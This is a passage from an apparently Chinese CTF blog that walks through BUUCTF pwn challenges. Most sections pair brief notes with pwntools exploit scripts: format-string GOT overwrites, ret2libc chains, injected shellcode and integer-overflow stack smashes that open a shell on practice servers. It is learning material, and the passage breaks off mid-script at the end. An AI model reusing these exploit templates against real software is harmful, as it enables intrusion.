class="number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="PWN5"><a href="#PWN5" class="headerlink" title="PWN5"></a>PWN5</h3><p>照例</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210815225707104.png" alt="image-20210815225707104"></p>
<p>IDA</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210815225729946.png" alt="image-20210815225729946"></p>
<p>格式化字符串漏洞，根据if语句分析要改写unk_804C044之中的数据，然后输入数据对比atoi就行。</p>
<p>跟进</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210815230104471.png" alt="image-20210815230104471"></p>
<p>记录下地址</p>
<p>测偏移量</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20210815230158791.png" alt="image-20210815230158791"></p>
<p>数一下是10，又知道长度是4个字节，那么任意写就可表示为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%10<span class="variable">$hhn</span>%11<span class="variable">$hhn</span>%12<span class="variable">$hhn</span>%13<span class="variable">$hhn</span></span><br></pre></td></tr></table></figure>
<p>然后前边加上任写的地址就行</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26137</span>)</span><br><span class="line">addr = <span class="number">0x0804C044</span></span><br><span class="line">payload= p32(addr)+p32(addr+<span class="number">1</span>)+p32(addr+<span class="number">2</span>)+p32(addr+<span class="number">3</span>)+<span class="string">&quot;%10$hhn%11$hhn%12$hhn%13$hhn&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>思路二： <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0501f4dbaf9e">第五空间2019 决赛]PWN5  (jianshu.com)</a></p>
<p>用fmtstr构造更快，思路是利用格式化字符串改写atoi的got地址，将其改为system的地址，配合之后的输入，得到shell</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26137</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#改写atoi的got地址，将其改为system的地址</span></span><br><span class="line">atoi_got=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>32位ret2libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28218</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwn01&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn01&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>+<span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)*<span class="number">2</span>+p32(bin_sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive(）</span><br></pre></td></tr></table></figure>
<h3 id="ciscn2019n8"><a href="#ciscn2019n8" class="headerlink" title="ciscn2019n8"></a>ciscn2019n8</h3><p>保护全开，IDA</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211020203126501.png" alt="image-20211020203126501"></p>
<p>简单易懂，令var[13]=17就行</p>
<p>知识补充：qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它是word的四倍，8字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29558</span>)</span><br><span class="line">payload=<span class="string">b&quot;aaaa&quot;</span>*<span class="number">13</span>+p32(<span class="number">17</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>遇到timeout了，再加一遍地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26843</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">140</span>+p32(<span class="number">0x08048320</span>)+p32(<span class="number">0x08048320</span>)+p32(<span class="number">0x0804A024</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input:&quot;</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>wp参考：[(9条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/108274091">BUUCTF]PWN11——get_started_3dsctf_2016_mcmuyanga的博客-CSDN博客_get_started_3dsctf_2016</a></p>
<p>这题的主要方法就是利用ret持续控制程序</p>
<p>知识补充：</p>
<p>mprotect()函数：把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
<h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>wp参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mua2Uncle2blog/p/15180573.html">not_the_same_3dsctf_2016来自BUUCTF - Mua_Uncle_W - 博客园 (cnblogs.com)</a></p>
<p>知识补充：fopen，fgets函数，用fopen将flag.txt文件读取，fgets存放到f14g里面</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211021151827895.png" alt="image-20211021151827895"></p>
<p>跟进可知他在.bss段<img src="/2021/11/05/Buuctf-pwn/image-20211021152138878.png" alt="image-20211021152138878"></p>
<p>可以作为覆盖地址</p>
<p>垃圾数据填充 get_secret函数的地址  write函数的地址  fl4g变量的位置  最后是write函数的参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26002</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./same&#x27;</span>)</span><br><span class="line">flag_add=<span class="number">0x080ECA2D</span></span><br><span class="line">get_secret=<span class="number">0x080489a0</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2D</span>+p32(get_secret)+p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>])+p32(flag_add)+p32(<span class="number">0</span>)+p32(flag_add)+p32(<span class="number">45</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h3><p>.bss段上name可利用为/bin/sh</p>
<p>然后就是简单的栈溢出</p>
<p><img src="/2021/11/05/Buuctf-pwn/pwn学习记录/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70%23pic_center.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28304</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;tell me your name&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x601080</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;What do you want to say to me?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h3><p>IDA发现是getshell利用shellcode，直接nc</p>
<h3 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h3><p>‘sh’也可以拿shell，不一定是/bin/sh</p>
<p>ROPgadget查字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn2019ne5 --string &#39;sh&#39;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211023212427788.png" alt="image-20211023212427788"></p>
<p>然后IDA，主函数是一堆选项</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211023213232716.png" alt="image-20211023213232716"></p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211023213057682.png" alt="image-20211023213057682"></p>
<p>意思是最后是要退回到GetFlag里执行栈。</p>
<p>跟进GetFlag有strcpy函数，栈溢出。分别跟进dest和src</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211023212746980.png" alt="image-20211023212746980"></p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211023212505052.png" alt="image-20211023212505052"></p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211023212853269.png" alt="image-20211023212853269"></p>
<p>所以在shell前加8字节才能覆盖</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29146</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Please input admin password:&quot;</span>)</span><br><span class="line">r.sendline( <span class="string">&quot;administrator&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;0.Exit\n:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sys=<span class="number">0x080484d0</span></span><br><span class="line">sh=<span class="number">0x080482ea</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">76</span>+p32(sys)+<span class="string">&#x27;aaaa&#x27;</span>+p32(sh)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Please input new log info:&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;0.Exit\n:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h3><p>64位简简单单的ret2libc，直接套模板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn07&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27518</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./bjdbabyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400733</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pull up your sword and tell me u story!&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h3><p>wp参考：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xlrp/p/14273706.html">BUUCFT]PWN——pwn2_sctf_2016 - Angel-Yan - 博客园 (cnblogs.com)</a></p>
<p>查</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211026173858837.png" alt="image-20211026173858837"></p>
<p>IDA</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211026174310934.png" alt="image-20211026174310934"></p>
<p>发现溢出点</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211026175946526.png" alt="image-20211026175946526"></p>
<p>跟进atoi，发现整数溢出</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211026174359554.png" alt="image-20211026174359554"></p>
<p>unsigned int，int等都可以利用整数溢出实现缓冲区溢出攻击。输入负数，绕过长度限制，造成溢出</p>
<p>没system，用ret2libc打，换printf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26337</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2sctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)<span class="comment">#输入-1的话会成为4294967295造成溢出</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main)+p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line"></span><br><span class="line">offset=printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h3><p>先查</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211026183855261.png" alt="image-20211026183855261"></p>
<p>IDA</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211026183908484.png" alt="image-20211026183908484"></p>
<p>标准最简单的格式化字符串</p>
<p>经典测偏移</p>
<p><img src="/2021/11/05/Buuctf-pwn/image-20211026183942799.png" alt="image-20211026183942799"></p>
<p>11</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26189</span>)</span><br><span class="line">x_addr=<span class="number">0x0804a02c</span></span><br><span class="line">payload=p32(x_addr)+<span class="string">&#x27;%11$n&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><p>标准的简单整数溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./CGfsb&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29824</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;[+]Please input the length of your name:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">backdoor=<span class="number">0x400726</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="baby-rop2"><a href="#baby-rop2" class="headerlink" title="baby_rop2"></a>baby_rop2</h3><p>wp参考：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xlrp/p/14273707.html">BUUCTF]PWN——[HarekazeCTF2019]baby_rop2 - Angel-Yan - 博客园 (cnblogs.com)</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28485</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400731</span> </span><br><span class="line">format_str = <span class="number">0x0000000000400770</span>  </span><br><span class="line">ret_addr = <span class="number">0x0000000000400734</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, 